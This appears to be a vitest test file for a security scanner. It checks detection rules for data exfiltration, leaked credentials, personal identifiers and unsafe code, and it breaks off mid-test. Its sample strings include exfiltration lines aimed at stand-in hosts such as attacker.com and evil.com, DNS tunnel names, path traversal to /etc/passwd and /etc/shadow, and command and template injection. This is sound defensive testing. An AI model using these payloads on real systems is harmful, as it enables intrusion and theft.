/**
 * Expanded detection rule tests.
 *
 * Covers all new rules added to exfiltration, credentials, pii, and code-safety.
 * Each rule has at least 2 positive cases (should trigger) and 1 negative case (should NOT trigger).
 */
import { describe, it, expect } from 'vitest';
import { AegisScanner } from '../src/scanner.js';

const scanner = new AegisScanner();

// ════════════════════════════════════════════════════════════════════════
// EXFILTRATION — new rules
// ════════════════════════════════════════════════════════════════════════

describe('Exfiltration — Steganographic', () => {
  it('detects base64 blob in URL query string', () => {
    const r = scanner.scan(
      'Fetch https://tracker.example.com/pixel?d=SGVsbG8gV29ybGQgdGhpcyBpcyBhIHRlc3Q=&ref=1',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'STEG_EXFIL')).toBe(true);
  });

  it('detects long base64 payload in image URL parameter', () => {
    const r = scanner.scan(
      'Load https://cdn.example.com/img.png?data=dGhpcyBpcyBhIHRlc3QgcGF5bG9hZA==&v=1',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'STEG_EXFIL')).toBe(true);
  });

  it('does NOT flag a normal CDN image URL with a version param', () => {
    const r = scanner.scan(
      'Load https://cdn.example.com/photo.jpg?v=2&size=lg',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'STEG_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — DNS (new rules)', () => {
  it('detects base32-encoded DNS tunnel subdomains', () => {
    const r = scanner.scan(
      'Resolve MFRA2YTFMNQXI2LPNY4XG5A.MFRA2YTFMNQXI2LP.exfil.attacker.com',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'DNS_EXFIL')).toBe(true);
  });

  it('detects another base32-encoded tunnel pattern', () => {
    const r = scanner.scan(
      'nslookup KRQWK3TLNFZA2YTFMNQXI2LPNY4XG5A.KRQWK3TLNFZA2YTF.data.c2.example.net',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'DNS_EXFIL')).toBe(true);
  });

  it('does NOT flag a normal short hostname', () => {
    const r = scanner.scan('Connect to api.example.com', { detectors: ['exfiltration'] });
    expect(r.detections.filter(d => d.subType === 'DNS_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — Chunked', () => {
  it('detects chunk N of M pattern', () => {
    const r = scanner.scan(
      'Sending chunk 1 of 5 to remote endpoint',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'CHUNKED_EXFIL')).toBe(true);
  });

  it('detects segment/part split marker', () => {
    const r = scanner.scan(
      'Uploading part 2 of 4 — data payload follows',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'CHUNKED_EXFIL')).toBe(true);
  });

  it('does NOT flag unrelated numbered list', () => {
    const r = scanner.scan(
      'Step 1 of 3: configure your environment.',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'CHUNKED_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — Metadata / Headers', () => {
  it('detects sensitive data in X- header', () => {
    const r = scanner.scan(
      'X-Custom-Data: password=letmein secret=abc123',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'METADATA_EXFIL')).toBe(true);
  });

  it('detects token in User-Agent with long base64 blob', () => {
    const r = scanner.scan(
      'User-Agent: MyApp/1.0 dGVzdC1zZWNyZXQtdG9rZW4tdmFsdWUtaGVyZQ==',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'METADATA_EXFIL')).toBe(true);
  });

  it('does NOT flag a normal User-Agent header', () => {
    const r = scanner.scan(
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'METADATA_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — Redirect-based', () => {
  it('detects window.location redirect to external domain', () => {
    const r = scanner.scan(
      'window.location = "https://attacker.com/collect"',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'REDIRECT_EXFIL')).toBe(true);
  });

  it('detects open redirect URL parameter', () => {
    const r = scanner.scan(
      'https://legit.com/login?redirect=https://evil.com/steal',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'REDIRECT_EXFIL')).toBe(true);
  });

  it('does NOT flag a relative redirect param', () => {
    const r = scanner.scan(
      'https://app.com/login?next=/dashboard',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'REDIRECT_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — Webhook (arbitrary POST)', () => {
  it('detects fetch() call with password field', () => {
    const r = scanner.scan(
      'fetch("https://remote.io/collect", { body: { password: val } })',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'WEBHOOK_EXFIL')).toBe(true);
  });

  it('detects requests.post() with secret field', () => {
    const r = scanner.scan(
      'requests.post(url, data={"api_key": api_key, "secret": s})',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'WEBHOOK_EXFIL')).toBe(true);
  });

  it('does NOT flag a benign fetch call', () => {
    const r = scanner.scan(
      'fetch("/api/users", { method: "GET" })',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'WEBHOOK_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — Email', () => {
  it('detects sendmail with password in body', () => {
    const r = scanner.scan(
      'sendmail(to="attacker@evil.com", body="password is " + password)',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'EMAIL_EXFIL')).toBe(true);
  });

  it('detects mailto: with secret in query', () => {
    const r = scanner.scan(
      'mailto:attacker@evil.com?subject=exfil&body=api_key%3Dabc123',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'EMAIL_EXFIL')).toBe(true);
  });

  it('does NOT flag a normal contact email link', () => {
    const r = scanner.scan(
      'mailto:support@company.com?subject=Help',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'EMAIL_EXFIL')).toHaveLength(0);
  });
});

describe('Exfiltration — Encoded path traversal', () => {
  it('detects %2e%2e%2f encoded traversal', () => {
    const r = scanner.scan(
      'GET /api/files/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'PATH_TRAVERSAL')).toBe(true);
  });

  it('detects ..%2f mixed traversal', () => {
    const r = scanner.scan(
      'path: ..%2f..%2fconf%2fsecrets.env',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.some(d => d.subType === 'PATH_TRAVERSAL')).toBe(true);
  });

  it('does NOT flag a normal URL with percent-encoded space', () => {
    const r = scanner.scan(
      'GET /files/my%20document.pdf',
      { detectors: ['exfiltration'] },
    );
    expect(r.detections.filter(d => d.subType === 'PATH_TRAVERSAL')).toHaveLength(0);
  });
});

// ════════════════════════════════════════════════════════════════════════
// CREDENTIALS — new rules
// ════════════════════════════════════════════════════════════════════════

describe('Credentials — GCP service account', () => {
  it('detects "type": "service_account" JSON', () => {
    const r = scanner.scan(
      '{"type": "service_account", "project_id": "my-project"}',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'GCP_SERVICE_ACCOUNT')).toBe(true);
  });

  it('detects private_key_id field with 40-char hex', () => {
    const r = scanner.scan(
      '"private_key_id": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'GCP_SERVICE_ACCOUNT')).toBe(true);
  });

  it('does NOT flag unrelated JSON type field', () => {
    const r = scanner.scan(
      '{"type": "oauth2", "token": "abc"}',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'GCP_SERVICE_ACCOUNT')).toHaveLength(0);
  });
});

describe('Credentials — Azure', () => {
  it('detects Azure connection string AccountKey', () => {
    const r = scanner.scan(
      'DefaultEndpointsProtocol=https;AccountName=mystorge;AccountKey=dGVzdGtleXRlc3RrZXl0ZXN0a2V5dGVzdGtleXQ=;EndpointSuffix=core.windows.net',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'AZURE_CONNECTION_STRING')).toBe(true);
  });

  it('detects Azure connection string with longer key', () => {
    const r = scanner.scan(
      'AccountKey=AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKl==',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'AZURE_CONNECTION_STRING')).toBe(true);
  });

  it('does NOT flag AccountName without AccountKey', () => {
    const r = scanner.scan(
      'AccountName=mystorageaccount',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'AZURE_CONNECTION_STRING')).toHaveLength(0);
  });
});

describe('Credentials — SSH / OpenSSH private keys', () => {
  it('detects OpenSSH private key header', () => {
    const r = scanner.scan(
      '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjE=\n-----END OPENSSH PRIVATE KEY-----',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'PRIVATE_KEY')).toBe(true);
  });

  it('detects RSA private key header', () => {
    const r = scanner.scan(
      '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'PRIVATE_KEY')).toBe(true);
  });

  it('does NOT flag a public key header', () => {
    const r = scanner.scan(
      '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAA==\n-----END PUBLIC KEY-----',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'PRIVATE_KEY')).toHaveLength(0);
  });
});

describe('Credentials — HuggingFace token', () => {
  it('detects hf_ prefixed token', () => {
    const r = scanner.scan(
      'HF_TOKEN=hf_ABcDeFgHiJkLmNoPqRsTuVwXyZ12345',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'HUGGINGFACE_TOKEN')).toBe(true);
  });

  it('detects hf_ token in code comment', () => {
    const r = scanner.scan(
      '# token: hf_qwERtyUIopAsDfGhJkLzXcVbNm',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'HUGGINGFACE_TOKEN')).toBe(true);
  });

  it('does NOT flag a short hf_ string', () => {
    const r = scanner.scan(
      'hf_short',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'HUGGINGFACE_TOKEN')).toHaveLength(0);
  });
});

describe('Credentials — SendGrid key', () => {
  it('detects SG. prefixed API key', () => {
    const r = scanner.scan(
      'SENDGRID_API_KEY=SG.abcdefghijklmnopqrstu.vwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'SENDGRID_KEY')).toBe(true);
  });

  it('detects SendGrid key inline in config', () => {
    const r = scanner.scan(
      'key: SG.TestKeyAbcDefGhiJklMnop.TestKeyAbcDefGhiJklMnop1234567',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'SENDGRID_KEY')).toBe(true);
  });

  it('does NOT flag a short SG. string', () => {
    const r = scanner.scan(
      'SG.short.x',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'SENDGRID_KEY')).toHaveLength(0);
  });
});

describe('Credentials — Twilio', () => {
  it('detects Twilio Account SID (AC + 32 hex)', () => {
    const r = scanner.scan(
      'TWILIO_SID=ACa1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'TWILIO_CREDENTIAL')).toBe(true);
  });

  it('detects Twilio auth token in env var', () => {
    const r = scanner.scan(
      'twilio_auth_token = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'TWILIO_CREDENTIAL')).toBe(true);
  });

  it('does NOT flag a short AC-prefixed string', () => {
    const r = scanner.scan(
      'ACshort',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'TWILIO_CREDENTIAL')).toHaveLength(0);
  });
});

describe('Credentials — Datadog key', () => {
  it('detects DD_API_KEY env var', () => {
    const r = scanner.scan(
      'DD_API_KEY=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'DATADOG_KEY')).toBe(true);
  });

  it('detects datadog_app_key in config', () => {
    const r = scanner.scan(
      'datadog_app_key: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'DATADOG_KEY')).toBe(true);
  });

  it('does NOT flag unrelated DD_ env vars', () => {
    const r = scanner.scan(
      'DD_TRACE_ENABLED=true',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'DATADOG_KEY')).toHaveLength(0);
  });
});

describe('Credentials — Discord bot token', () => {
  it('detects Discord bot token format', () => {
    const r = scanner.scan(
      'token: MTIzNDU2Nzg5MDEyMzQ1Ng.GaBcDe.AbCdEfGhIjKlMnOpQrStUvWxYz1234567',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'DISCORD_TOKEN')).toBe(true);
  });

  it('detects Discord token in environment variable', () => {
    const r = scanner.scan(
      'DISCORD_BOT_TOKEN=MTE1MjM0NTY3ODkwMTIzNDU.GhIjKl.AbCdEfGhIjKlMnOpQrStUvWxYz1',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'DISCORD_TOKEN')).toBe(true);
  });

  it('does NOT flag a short dot-separated string', () => {
    const r = scanner.scan(
      'version: 1.2.3',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'DISCORD_TOKEN')).toHaveLength(0);
  });
});

describe('Credentials — OAuth / Bearer tokens', () => {
  it('detects non-JWT Bearer token in Authorization header', () => {
    const r = scanner.scan(
      'Authorization: Bearer ya29.A0ARrdaM-abcdefghijklmnopqrstuvwxyz',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'BEARER_TOKEN')).toBe(true);
  });

  it('detects oauth_access_token in config', () => {
    const r = scanner.scan(
      'oauth_access_token = "1/abcdefghijklmnopqrstuvwxyz0123456"',
      { detectors: ['credentials'] },
    );
    expect(r.detections.some(d => d.subType === 'BEARER_TOKEN')).toBe(true);
  });

  it('does NOT flag a standard JWT Bearer (eyJ prefix)', () => {
    // JWT tokens are caught by the JWT rule, not the bearer rule
    const r = scanner.scan(
      'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.abc123',
      { detectors: ['credentials'] },
    );
    expect(r.detections.filter(d => d.subType === 'BEARER_TOKEN')).toHaveLength(0);
  });
});

// ════════════════════════════════════════════════════════════════════════
// PII — new rules
// ════════════════════════════════════════════════════════════════════════

describe('PII — International phone numbers', () => {
  it('detects UK phone number (+44)', () => {
    const r = scanner.scan('Call me at +44 7911 123456', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PHONE_INTL')).toBe(true);
  });

  it('detects German phone number (+49)', () => {
    const r = scanner.scan('Telefon: +49 30 12345678', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PHONE_INTL')).toBe(true);
  });

  it('detects French phone number (+33)', () => {
    const r = scanner.scan('Tel: +33 1 23 45 67 89', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PHONE_INTL')).toBe(true);
  });

  it('detects Indian phone number (+91)', () => {
    const r = scanner.scan('Mobile: +91 98765 43210', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PHONE_INTL')).toBe(true);
  });

  it('detects Australian phone number (+61)', () => {
    const r = scanner.scan('Contact: +61 2 1234 5678', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PHONE_INTL')).toBe(true);
  });

  it('detects Japanese phone number (+81)', () => {
    const r = scanner.scan('Phone: +81 3 1234 5678', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PHONE_INTL')).toBe(true);
  });

  it('does NOT flag a random +number sequence', () => {
    const r = scanner.scan('Increase by +100 units', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'PHONE_INTL')).toHaveLength(0);
  });
});

describe('PII — UK National Insurance Number', () => {
  it('detects UK NI number (standard format)', () => {
    const r = scanner.scan('NI: AB 12 34 56 C', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'UK_NI')).toBe(true);
  });

  it('detects UK NI number (no spaces)', () => {
    const r = scanner.scan('National Insurance: JN123456A', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'UK_NI')).toBe(true);
  });

  it('does NOT flag unrelated letter-number pattern', () => {
    const r = scanner.scan('Product code: XY-001234', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'UK_NI')).toHaveLength(0);
  });
});

describe('PII — Canadian SIN', () => {
  it('detects Canadian SIN in dashed format', () => {
    const r = scanner.scan('SIN: 123-456-789', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'CANADIAN_SIN')).toBe(true);
  });

  it('detects Canadian SIN with spaces', () => {
    const r = scanner.scan('Social Insurance Number: 987 654 321', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'CANADIAN_SIN')).toBe(true);
  });

  it('does NOT flag a US phone number as SIN', () => {
    // US phone is XXX-XXX-XXXX (10 digits) vs SIN XXX-XXX-XXX (9 digits)
    const r = scanner.scan('Call: 555-867-5309', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'CANADIAN_SIN')).toHaveLength(0);
  });
});

describe('PII — German Tax ID (Steuer-ID)', () => {
  it('detects Steuer-ID with label', () => {
    const r = scanner.scan('Steuer-ID: 12345678901', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'GERMAN_TAX_ID')).toBe(true);
  });

  it('detects Steueridentifikationsnummer label', () => {
    const r = scanner.scan('Steueridentifikationsnummer: 98765432100', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'GERMAN_TAX_ID')).toBe(true);
  });

  it('does NOT flag an 11-digit number without label', () => {
    const r = scanner.scan('Reference: 12345678901', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'GERMAN_TAX_ID')).toHaveLength(0);
  });
});

describe('PII — Indian Aadhaar', () => {
  it('detects 12-digit Aadhaar number', () => {
    const r = scanner.scan('Aadhaar: 2345 6789 0123', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'AADHAAR')).toBe(true);
  });

  it('detects Aadhaar without spaces', () => {
    const r = scanner.scan('UID: 987654321012', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'AADHAAR')).toBe(true);
  });

  it('does NOT flag a credit card number as Aadhaar', () => {
    // 16-digit CC numbers are too long for Aadhaar
    const r = scanner.scan('Card: 4111111111111111', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'AADHAAR')).toHaveLength(0);
  });
});

describe('PII — Medical Record Number', () => {
  it('detects MRN with label', () => {
    const r = scanner.scan('MRN: 1234567', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'MEDICAL_RECORD')).toBe(true);
  });

  it('detects "Medical Record Number" label', () => {
    const r = scanner.scan('Medical Record Number: 9876543', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'MEDICAL_RECORD')).toBe(true);
  });

  it('detects patient ID label', () => {
    const r = scanner.scan('Patient ID: 00123456', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'MEDICAL_RECORD')).toBe(true);
  });

  it('does NOT flag a 6-digit number without label', () => {
    const r = scanner.scan('Order #123456', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'MEDICAL_RECORD')).toHaveLength(0);
  });
});

describe('PII — IBAN', () => {
  it('detects a German IBAN', () => {
    const r = scanner.scan('IBAN: DE89 3704 0044 0532 0130 00', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'IBAN')).toBe(true);
  });

  it('detects a UK IBAN', () => {
    const r = scanner.scan('Bank: GB29 NWBK 6016 1331 9268 19', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'IBAN')).toBe(true);
  });

  it('does NOT flag a 2-letter country code alone', () => {
    const r = scanner.scan('Country: DE', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'IBAN')).toHaveLength(0);
  });
});

describe('PII — SWIFT/BIC code', () => {
  it('detects an 8-char BIC code', () => {
    const r = scanner.scan('BIC: DEUTDEDB', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'SWIFT_BIC')).toBe(true);
  });

  it('detects an 11-char BIC code', () => {
    const r = scanner.scan('SWIFT: BARCGB22XXX', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'SWIFT_BIC')).toBe(true);
  });

  it('does NOT flag a random 4-char word', () => {
    const r = scanner.scan('Code: ABCD', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'SWIFT_BIC')).toHaveLength(0);
  });
});

describe('PII — Passport numbers', () => {
  it('detects US passport number with label', () => {
    const r = scanner.scan('Passport Number: A12345678', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PASSPORT')).toBe(true);
  });

  it('detects UK numeric passport with label', () => {
    const r = scanner.scan('Passport No: 123456789', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PASSPORT')).toBe(true);
  });

  it('detects EU alphanumeric passport with label', () => {
    const r = scanner.scan('Passport#: DE1234567', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'PASSPORT')).toBe(true);
  });

  it('does NOT flag unlabeled 9-digit number', () => {
    const r = scanner.scan('Reference: 987654321', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'PASSPORT')).toHaveLength(0);
  });
});

describe('PII — Natural language date of birth', () => {
  it('detects "born on Month Day, Year"', () => {
    const r = scanner.scan('She was born on January 5, 1990.', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'DATE_OF_BIRTH')).toBe(true);
  });

  it('detects "born on Day Month Year"', () => {
    const r = scanner.scan('He was born on 12th March 1985.', { detectors: ['pii'] });
    expect(r.detections.some(d => d.subType === 'DATE_OF_BIRTH')).toBe(true);
  });

  it('does NOT flag "born in" without full date', () => {
    const r = scanner.scan('The company was born in 1990.', { detectors: ['pii'] });
    expect(r.detections.filter(d => d.subType === 'DATE_OF_BIRTH')).toHaveLength(0);
  });
});

// ════════════════════════════════════════════════════════════════════════
// CODE SAFETY — new rules
// ════════════════════════════════════════════════════════════════════════

describe('Code Safety — Prototype Pollution', () => {
  it('detects __proto__ assignment', () => {
    const r = scanner.scan('obj["__proto__"] = { isAdmin: true }', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'PROTOTYPE_POLLUTION')).toBe(true);
  });

  it('detects constructor.prototype modification', () => {
    const r = scanner.scan('obj.constructor.prototype.isAdmin = true', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'PROTOTYPE_POLLUTION')).toBe(true);
  });

  it('detects Object.setPrototypeOf()', () => {
    const r = scanner.scan('Object.setPrototypeOf(victim, malicious)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'PROTOTYPE_POLLUTION')).toBe(true);
  });

  it('does NOT flag a normal property assignment', () => {
    const r = scanner.scan('obj.name = "Alice"', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'PROTOTYPE_POLLUTION')).toHaveLength(0);
  });
});

describe('Code Safety — Deserialization', () => {
  it('detects pickle.loads()', () => {
    const r = scanner.scan('data = pickle.loads(user_input)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'DESERIALIZATION')).toBe(true);
  });

  it('detects yaml.unsafe_load()', () => {
    const r = scanner.scan('config = yaml.unsafe_load(file_content)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'DESERIALIZATION')).toBe(true);
  });

  it('detects yaml.load() without SafeLoader', () => {
    const r = scanner.scan('yaml.load(data)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'DESERIALIZATION')).toBe(true);
  });

  it('detects marshal.loads()', () => {
    const r = scanner.scan('obj = marshal.loads(payload)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'DESERIALIZATION')).toBe(true);
  });

  it('detects Java ObjectInputStream', () => {
    const r = scanner.scan('ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'DESERIALIZATION')).toBe(true);
  });

  it('does NOT flag json.loads() — safe deserialization', () => {
    const r = scanner.scan('data = json.loads(response.text)', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'DESERIALIZATION')).toHaveLength(0);
  });
});

describe('Code Safety — Template Injection', () => {
  it('detects Handlebars/Mustache {{ }} expression', () => {
    const r = scanner.scan('Hello {{user.name}}!', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'TEMPLATE_INJECTION')).toBe(true);
  });

  it('detects ${...} expression', () => {
    const r = scanner.scan('Welcome ${user.role}!', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'TEMPLATE_INJECTION')).toBe(true);
  });

  it('detects ERB <% %> expression', () => {
    const r = scanner.scan('<% system("id") %>', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'TEMPLATE_INJECTION')).toBe(true);
  });

  it('detects Jinja2 {% %} block', () => {
    const r = scanner.scan('{% for x in range(100) %}x{% endfor %}', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'TEMPLATE_INJECTION')).toBe(true);
  });

  it('detects Ruby #{} interpolation', () => {
    const r = scanner.scan('puts "Hello #{user_input}"', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'TEMPLATE_INJECTION')).toBe(true);
  });

  it('does NOT flag a CSS property value with braces', () => {
    const r = scanner.scan('color: rgb(255, 0, 0);', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'TEMPLATE_INJECTION')).toHaveLength(0);
  });
});

describe('Code Safety — Log Injection', () => {
  it('detects URL-encoded newline before log keyword', () => {
    const r = scanner.scan('username=%0aERROR: admin logged in', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'LOG_INJECTION')).toBe(true);
  });

  it('detects \\r\\n before log keyword', () => {
    const r = scanner.scan('user=alice\\r\\nINFO: user is admin', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'LOG_INJECTION')).toBe(true);
  });

  it('detects ANSI escape code', () => {
    const r = scanner.scan('Output: \x1b[31mRED\x1b[0m', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'LOG_INJECTION')).toBe(true);
  });

  it('detects \\x1b escape in string literal', () => {
    const r = scanner.scan('log("\\x1b[1;31m[CRITICAL]\\x1b[0m " + msg)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'LOG_INJECTION')).toBe(true);
  });

  it('does NOT flag a normal log statement', () => {
    const r = scanner.scan('console.log("User logged in")', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'LOG_INJECTION')).toHaveLength(0);
  });
});

describe('Code Safety — SSRF (code context)', () => {
  it('detects link-local 169.254.x.x in code', () => {
    const r = scanner.scan('url = "http://169.254.10.5/secrets"', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'SSRF')).toBe(true);
  });

  it('detects private range 10.x URL in code', () => {
    const r = scanner.scan('fetch("http://10.0.0.50/admin")', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'SSRF')).toBe(true);
  });

  it('detects IPv6 loopback [::1]', () => {
    const r = scanner.scan('Connect to http://[::1]:8080/internal', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'SSRF')).toBe(true);
  });

  it('does NOT flag a public IP address', () => {
    const r = scanner.scan('curl https://8.8.8.8/dns-query', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'SSRF')).toHaveLength(0);
  });
});

describe('Code Safety — Path Traversal', () => {
  it('detects ../../ sequences', () => {
    const r = scanner.scan('file = open("../../etc/passwd")', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'PATH_TRAVERSAL')).toBe(true);
  });

  it('detects URL-encoded %2e%2e%2f traversal', () => {
    const r = scanner.scan('path = "%2e%2e%2f%2e%2e%2fetc%2fpasswd"', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'PATH_TRAVERSAL')).toBe(true);
  });

  it('detects ....// obfuscated traversal', () => {
    const r = scanner.scan('readFile("....//....//etc/shadow")', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'PATH_TRAVERSAL')).toBe(true);
  });

  it('does NOT flag a normal relative path', () => {
    const r = scanner.scan('require("./utils/helper")', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'PATH_TRAVERSAL')).toHaveLength(0);
  });
});

describe('Code Safety — Command Injection', () => {
  it('detects backtick command substitution', () => {
    const r = scanner.scan('name = `whoami`', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'COMMAND_INJECTION')).toBe(true);
  });

  it('detects $() command substitution', () => {
    const r = scanner.scan('result = $(cat /etc/passwd)', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'COMMAND_INJECTION')).toBe(true);
  });

  it('detects semicolon pipe to bash', () => {
